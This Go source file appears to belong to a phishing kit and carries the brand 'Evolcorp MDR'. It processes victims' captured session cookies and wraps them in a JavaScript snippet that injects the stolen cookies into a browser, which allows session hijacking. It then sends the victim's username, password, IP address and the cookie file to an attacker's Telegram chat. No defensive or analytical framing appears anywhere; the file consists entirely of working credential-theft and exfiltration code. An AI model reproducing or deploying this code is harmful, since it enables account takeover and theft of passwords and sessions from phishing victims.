package main

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

type Token struct {
	Name             string      `json:"name"`
	Value            string      `json:"value"`
	Domain           string      `json:"domain"`
	HostOnly         bool        `json:"hostOnly"`
	Path             string      `json:"path"`
	Secure           bool        `json:"secure"`
	HttpOnly         bool        `json:"httpOnly"`
	SameSite         string      `json:"sameSite"`
	Session          bool        `json:"session"`
	FirstPartyDomain string      `json:"firstPartyDomain"`
	PartitionKey     interface{} `json:"partitionKey"`
	ExpirationDate   *int64      `json:"expirationDate,omitempty"`
	StoreID          interface{} `json:"storeId"`
}

func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
	var tokens []Token

	for domain, tokenGroup := range input {
		for _, tokenData := range tokenGroup {
			var t Token

			if name, ok := tokenData["Name"].(string); ok {
				t.Name = name
			}
			if val, ok := tokenData["Value"].(string); ok {
				t.Value = val
			}
			// Remove leading dot from domain
			if len(domain) > 0 && domain[0] == '.' {
				domain = domain[1:]
			}
			t.Domain = domain

			if hostOnly, ok := tokenData["HostOnly"].(bool); ok {
				t.HostOnly = hostOnly
			}
			if path, ok := tokenData["Path"].(string); ok {
				t.Path = path
			}
			if secure, ok := tokenData["Secure"].(bool); ok {
				t.Secure = secure
			}
			if httpOnly, ok := tokenData["HttpOnly"].(bool); ok {
				t.HttpOnly = httpOnly
			}
			if sameSite, ok := tokenData["SameSite"].(string); ok {
				t.SameSite = sameSite
			}
			if session, ok := tokenData["Session"].(bool); ok {
				t.Session = session
			}
			if fpd, ok := tokenData["FirstPartyDomain"].(string); ok {
				t.FirstPartyDomain = fpd
			}
			if pk, ok := tokenData["PartitionKey"]; ok {
				t.PartitionKey = pk
			}
			if storeID, ok := tokenData["storeId"]; ok {
				t.StoreID = storeID
			} else if storeID, ok := tokenData["StoreID"]; ok {
				t.StoreID = storeID
			}

			// Remove expirationDate field
			t.ExpirationDate = nil

			tokens = append(tokens, t)
		}
	}
	return tokens
}

func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
	var consolidatedTokens []Token

	// Parse and extract tokens for each category
	for _, tokenJSON := range []string{sessionTokens, httpTokens, bodyTokens, customTokens} {
		if tokenJSON == "" {
			continue
		}

		var rawTokens map[string]map[string]map[string]interface{}
		if err := json.Unmarshal([]byte(tokenJSON), &rawTokens); err != nil {
			return nil, fmt.Errorf("error parsing token JSON: %v", err)
		}

		tokens := extractTokens(rawTokens)

		// Remove expirationDate from each token before saving
		for i := range tokens {
			tokens[i].ExpirationDate = nil
		}

		consolidatedTokens = append(consolidatedTokens, tokens...)
	}

	return consolidatedTokens, nil
}

// Define a map to store session IDs and a mutex for thread-safe access
var processedSessions = make(map[string]bool)
var sessionMessageMap = make(map[string]int)
var mu sync.Mutex

func createTxtFile(session Session) (string, error) {
	// Create a text file name based on the email and timestamp
	safeEmail := strings.ReplaceAll(session.Username, "@", "_")
	safeEmail = strings.ReplaceAll(safeEmail, ".", "_")
	timestamp := time.Now().Format("20060102_150405") // YYYYMMDD_HHMMSS format
	txtFileName := fmt.Sprintf("%s_%s.txt", safeEmail, timestamp)

	txtFilePath := filepath.Join(os.TempDir(), txtFileName)

	// Create a new text file
	txtFile, err := os.Create(txtFilePath)
	if err != nil {
		return "", fmt.Errorf("failed to create text file: %v", err)
	}
	defer txtFile.Close()

	// Marshal tokens into JSON
	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal tokens: %v", err)
	}

	// Wrap JSON inside JavaScript function
	jsWrapper := fmt.Sprintf(`(function(){
let cookies = JSON.parse('%s');
function putCookie(key, value, domain, path, isSecure) {
        const cookieMaxAge = 'Max-Age=31536000';
        if (isSecure) {
                console.log('Setting Cookie', key, value);
                document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=' + path + '; Secure; SameSite=None';
            } else {
                console.log('Setting Cookie', key, value);
                document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=' + path + ';';
            }
        }
        for (let cookie of cookies) {
            putCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure);
        }
}());`, strings.ReplaceAll(string(tokensJSON), "'", "\\'"))

	// Write the wrapped JavaScript content into the text file
	_, err = txtFile.WriteString(jsWrapper)
	if err != nil {
		return "", fmt.Errorf("failed to write data to text file: %v", err)
	}

	return txtFilePath, nil
}

func formatSessionMessage(session Session) string {
	// Format the session information (no token data in message)
	return fmt.Sprintf("🔐 Evolcorp MDR 🔐\n\n"+
		"👤 Username:      🪤 %s\n"+
		"🔑 Password:      🪤 %s\n"+
		"🌐 Landing URL:   🪤 %s\n\n"+
		"🖥️ User Agent:    🪤 %s\n"+
		"🌍 Remote Address:🪤 %s\n"+
		"🕒 Create Time:   🪤 %d\n\n"+
		"📦 Token Delivery. 🍪 incoming.\n",
		session.Username,
		session.Password,
		session.LandingURL,
		session.UserAgent,
		session.RemoteAddr,
		session.CreateTime,
	)
}

func Notify(session Session) {
	config, err := loadConfig()
	if err != nil {
		fmt.Println(err)
		return
	}

	mu.Lock()
	if processedSessions[string(session.ID)] {
		mu.Unlock()
		return
	}

	processedSessions[string(session.ID)] = true
	mu.Unlock()

	txtFilePath, err := createTxtFile(session)
	if err != nil {
		fmt.Println("Error creating TXT file:", err)
		return
	}

	message := formatSessionMessage(session)
	messageID, err := sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message, txtFilePath)
	if err != nil {
		fmt.Printf("Error sending Telegram notification: %v\n", err)
		os.Remove(txtFilePath)
		return
	}

	mu.Lock()
	sessionMessageMap[string(session.ID)] = messageID
	mu.Unlock()

	os.Remove(txtFilePath)
}
